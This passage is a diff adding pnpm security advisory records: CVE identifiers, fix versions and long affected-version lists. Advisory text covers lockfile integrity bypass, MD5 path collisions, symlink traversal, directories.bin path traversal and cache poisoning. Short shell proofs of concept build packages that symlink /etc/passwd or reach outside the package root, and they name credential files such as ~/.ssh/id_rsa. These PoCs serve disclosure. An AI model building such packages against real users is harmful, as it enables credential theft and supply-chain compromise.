+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/6ca07ffbe6fc0e8b8cdc968f228903ba0886f7c0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-6x96-7vc8-cm3p",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.28.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2",
+        "10.27.0",
+        "10.28.0"
+      ]
+    },
+    {
+      "id": "GHSA-7vhp-vf5g-r2fw",
+      "primary_id": "CVE-2025-69263",
+      "aliases": [
+        "CVE-2025-69263"
+      ],
+      "cve_ids": [
+        "CVE-2025-69263"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm Has Lockfile Integrity Bypass that Allows Remote Dynamic Dependencies",
+      "details": "### Summary\n\nHTTP tarball dependencies (and git-hosted tarballs) are stored in the lockfile without integrity hashes. This allows the remote server to serve different content on each install, even when a lockfile is committed.\n\n### Details\n\nWhen a package depends on an HTTP tarball URL, pnpm's tarball resolver returns only the URL without computing an integrity hash:\n\n`resolving/tarball-resolver/src/index.ts`:\n```javascript\nreturn {\n  resolution: {\n    tarball: resolvedUrl,\n    // No integrity field\n  },\n  resolvedVia: 'url',\n}\n```\n\nThe resulting lockfile entry has no integrity to verify:\n```yaml\nremote-dynamic-dependency@http://example.com/pkg.tgz:\n  resolution: {tarball: http://example.com/pkg.tgz}\n  version: 1.0.0\n```\n\nSince there is no integrity hash, pnpm cannot detect when the server returns different content. \n\nThis affects:\n- HTTP/HTTPS tarball URLs (`\"pkg\": \"https://example.com/pkg.tgz\"`)\n- Git shorthand dependencies (`\"pkg\": \"github:user/repo\"`)\n- Git URLs (`\"pkg\": \"git+https://github.com/user/repo\"`)\n\nnpm registry packages are not affected as they include integrity hashes from the registry metadata.\n\n### PoC\n\nSee attached [pnpm-bypass-integrity-poc.zip](https://github.com/user-attachments/files/23819648/pnpm-bypass-integrity-poc.zip)\n\nThe POC includes:\n- A server that returns different tarball content on each request\n- A `malicious-package` that depends on the HTTP tarball\n- A `victim` project that depends on `malicious-package`\n\nTo run:\n```bash\ncd pnpm-bypass-integrity-poc\n./run-poc.sh\n```\n\nThe output shows that each install (with `pnpm store prune` between them) downloads different code despite having a committed lockfile.\n\n### Impact\n\nAn attacker who publishes a package with an HTTP tarball dependency can serve different code to different users or CI/CD environments. This enables:\n\n- Targeted attacks based on request metadata (IP, headers, timing)\n- Evasion of security audits (serve benign code during review, malicious code later)\n- Supply chain attacks where the malicious payload changes over time\n\nThe attack requires the victim to install a package that has an HTTP/git tarball in its dependency tree. The victim's lockfile provides no protection.",
+      "published": "2026-01-07T19:06:59Z",
+      "modified": "2026-02-03T03:16:20.731152Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-7vhp-vf5g-r2fw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69263"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/0958027f88a99ccefe7e9676cdebba393dfbdc85"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-7vhp-vf5g-r2fw",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.26.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0"
+      ]
+    },
+    {
+      "id": "GHSA-8cc4-rfj6-fhg4",
+      "primary_id": "CVE-2024-47829",
+      "aliases": [
+        "CVE-2024-47829"
+      ],
+      "cve_ids": [
+        "CVE-2024-47829"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm uses the md5 path shortening function causes packet paths to coincide, which causes indirect packet overwriting",
+      "details": "The path shortening function is used in pnpm\uff1a\n```\nexport function depPathToFilename (depPath: string, maxLengthWithoutHash: number): string {\n  let filename = depPathToFilenameUnescaped(depPath).replace(/[\\\\/:*?\"<>|]/g, '+')\n  if (filename.includes('(')) {\n    filename = filename\n      .replace(/\\)$/, '')\n      .replace(/(\\)\\()|\\(|\\)/g, '_')\n  }\n  if (filename.length > maxLengthWithoutHash || filename !== filename.toLowerCase() && !filename.startsWith('file+')) {\n    return `${filename.substring(0, maxLengthWithoutHash - 27)}_${createBase32Hash(filename)}`\n  }\n  return filename\n}\n```\nHowever, it uses the md5 function as a path shortening compression function, and if a collision occurs, it will result in the same storage path for two different libraries. Although the real names are under the package name /node_modoules/, there are no version numbers for the libraries they refer to.\n![Schematic picture](https://github.com/user-attachments/assets/7b8b87ab-f297-47bd-a9dd-43be86e36ed2)\nIn the diagram, we assume that two packages are called packageA and packageB, and that the first 90 digits of their package names must be the same, and that the hash value of the package names with versions must be the same.  Then C is the package that they both reference, but with a different version number.  (npm allows package names up to 214 bytes, so constructing such a collision package name is obvious.)\n\nThen hash(packageA@1.2.3)=hash(packageB@3.4.5).  This results in the same path for the installation, and thus under the same directory.  Although the package names under node_modoules are the full paths again, they are shared with C.\nWhat is the exact version number of C?\nIn our local tests, it depends on which one is installed later.  If packageB is installed later, the C version number will change to 2.0.0.  At this time, although package A requires the C@1.0.0 version, package. json will only work during installation, and will not affect the actual operation.\nWe did not receive any installation error issues from pnpm during our local testing, nor did we use force, which is clearly a case that can be triggered.\n\nFor a package with a package name + version number longer than 120, another package can be constructed to introduce an indirect reference to a lower version, such as one with some known vulnerability.\nAlternatively, it is possible to construct two packages with more than 120 package names + version numbers.\nThis is clearly an advantage for those intent on carrying out supply chain attacks.\n\n\nThe solution:\nThe repair cost is also very low, just need to upgrade the md5 function to sha256.",
+      "published": "2025-04-23T14:05:47Z",
+      "modified": "2025-04-23T19:15:59Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-8cc4-rfj6-fhg4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47829"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-8cc4-rfj6-fhg4",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.0.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3"
+      ]
+    },
+    {
+      "id": "GHSA-m733-5w8f-5ggw",
+      "primary_id": "CVE-2026-24056",
+      "aliases": [
+        "CVE-2026-24056"
+      ],
+      "cve_ids": [
+        "CVE-2026-24056"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm has symlink traversal in file:/git dependencies",
+      "details": "### Summary\nWhen pnpm installs a `file:` (directory) or `git:` dependency, it follows symlinks and reads their target contents without constraining them to the package root. A malicious package containing a symlink to an absolute path (e.g., `/etc/passwd`, `~/.ssh/id_rsa`) causes pnpm to copy that file's contents into `node_modules`, leaking local data.\n\n**Preconditions:** Only affects `file:` and `git:` dependencies. Registry packages (npm) have symlinks stripped during publish and are NOT affected.\n\n### Details\nThe vulnerability exists in `store/cafs/src/addFilesFromDir.ts`. The code uses `fs.statSync()` and `readFileSync()` which follow symlinks by default:\n\n```typescript\nconst absolutePath = path.join(dirname, relativePath)\nconst stat = fs.statSync(absolutePath)  // Follows symlinks!\nconst buffer = fs.readFileSync(absolutePath)  // Reads symlink TARGET\n```\n\nThere is no check that `absolutePath` resolves to a location inside the package directory.\n\n### PoC\n```bash\n# Create malicious package\nmkdir -p /tmp/evil && cd /tmp/evil\nln -s /etc/passwd leaked-passwd.txt\necho '{\"name\":\"evil\",\"version\":\"1.0.0\",\"files\":[\"*.txt\"]}' > package.json\n\n# Victim installs\nmkdir /tmp/victim && cd /tmp/victim\npnpm init && pnpm add file:../evil\n\n# Leaked!\ncat node_modules/evil/leaked-passwd.txt\n```\n\n### Impact\n- Developers installing local/file dependencies\n- CI/CD pipelines installing git dependencies\n- Credential theft via symlinks to `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_rsa`\n\n### Suggested Fix\nUse `lstatSync` to detect symlinks and reject those pointing outside the package root in `store/cafs/src/addFilesFromDir.ts`.",
+      "published": "2026-01-26T21:02:33Z",
+      "modified": "2026-02-03T03:06:25.152863Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-m733-5w8f-5ggw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24056"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/b277b45bc35ae77ca72d7634d144bbd58a48b70f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-m733-5w8f-5ggw",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.28.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2",
+        "10.27.0",
+        "10.28.0",
+        "10.28.1"
+      ]
+    },
+    {
+      "id": "GHSA-v253-rj99-jwpq",
+      "primary_id": "CVE-2026-24131",
+      "aliases": [
+        "CVE-2026-24131"
+      ],
+      "cve_ids": [
+        "CVE-2026-24131"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm has Path Traversal via arbitrary file permission modification ",
+      "details": "### Summary\nWhen pnpm processes a package's `directories.bin` field, it uses `path.join()` without validating the result stays within the package root. A malicious npm package can specify `\"directories\": {\"bin\": \"../../../../tmp\"}` to escape the package directory, causing pnpm to chmod 755 files at arbitrary locations.\n\n**Note:** Only affects Unix/Linux/macOS. Windows is not affected (`fixBin` gated by `EXECUTABLE_SHEBANG_SUPPORTED`).\n\n### Details\nVulnerable code in `pkg-manager/package-bins/src/index.ts:15-21`:\n\n```typescript\nif (manifest.directories?.bin) {\n  const binDir = path.join(pkgPath, manifest.directories.bin)  // NO VALIDATION\n  const files = await findFiles(binDir)\n  // ... files outside package returned, then chmod 755'd\n}\n```\n\nThe `bin` field IS protected with `isSubdir()` at line 53, but `directories.bin` lacks this check.\n\n### PoC\n```bash\n# Create malicious package\nmkdir /tmp/malicious-pkg\necho '{\"name\":\"malicious\",\"version\":\"1.0.0\",\"directories\":{\"bin\":\"../../../../tmp/target\"}}' > /tmp/malicious-pkg/package.json\n\n# Create sensitive file\nmkdir -p /tmp/target\necho \"secret\" > /tmp/target/secret.sh\nchmod 600 /tmp/target/secret.sh  # Private\n\n# Install\npnpm add file:/tmp/malicious-pkg\n\n# Check permissions\nls -la /tmp/target/secret.sh  # Now 755 (world-readable)\n```\n\n### Impact\n- Supply-chain attack via npm packages\n- File permissions changed from 600 to 755 (world-readable)\n- Affects non-dotfiles in predictable paths (dotfiles excluded by tinyglobby default)\n\n### Suggested Fix\nAdd `isSubdir` validation for `directories.bin` paths in `pkg-manager/package-bins/src/index.ts`, matching the existing validation in `commandsFromBin()`:\n\n```typescript\nif (manifest.directories?.bin) {\n  const binDir = path.join(pkgPath, manifest.directories.bin)\n  if (!isSubdir(pkgPath, binDir)) {\n    return []  // Reject paths outside package\n  }\n  // ...\n}\n```",
+      "published": "2026-01-26T21:29:58Z",
+      "modified": "2026-02-03T03:07:47.088542Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-v253-rj99-jwpq"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/17432ad5bbed5c2e77255ca6d56a1449bbcfd943"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-v253-rj99-jwpq",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.28.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2",
+        "10.27.0",
+        "10.28.0",
+        "10.28.1"
+      ]
+    },
+    {
+      "id": "GHSA-vm32-9rqf-rh3r",
+      "primary_id": "CVE-2024-53866",
+      "aliases": [
+        "CVE-2024-53866"
+      ],
+      "cve_ids": [
+        "CVE-2024-53866"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion",
+      "details": "### Summary\n\npnpm seems to mishandle overrides and global cache:\n1. Overrides from one workspace leak into npm metadata saved in global cache\n2. npm metadata from global cache affects other workspaces\n3. installs by default don't revalidate the data (including on first lockfile generation)\n\nThis can make workspace A (even running with `ignore-scripts=true`) posion global cache and execute scripts in workspace B\n\nUsers generally expect `ignore-scripts` to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).\n\nHere, that expectation is broken\n\n### Details\n\nSee PoC.\n\nIn it, overrides from a single run of A get leaked into e.g. `~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json` and persistently affect all other projects using the cache\n\n### PoC\n\nPostinstall code used in PoC is benign and can be inspected in <https://www.npmjs.com/package/ponyhooves?activeTab=code>, it's just a `console.log`\n\n1. Remove store and cache\n   On mac: `rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store`\n   This step is not required in general, but we'll be using a popular package for PoC that's likely cached\n2. Create `A/package.json`:\n   ```json\n   {\n     \"name\": \"A\",\n     \"pnpm\": { \"overrides\": { \"rimraf>glob\": 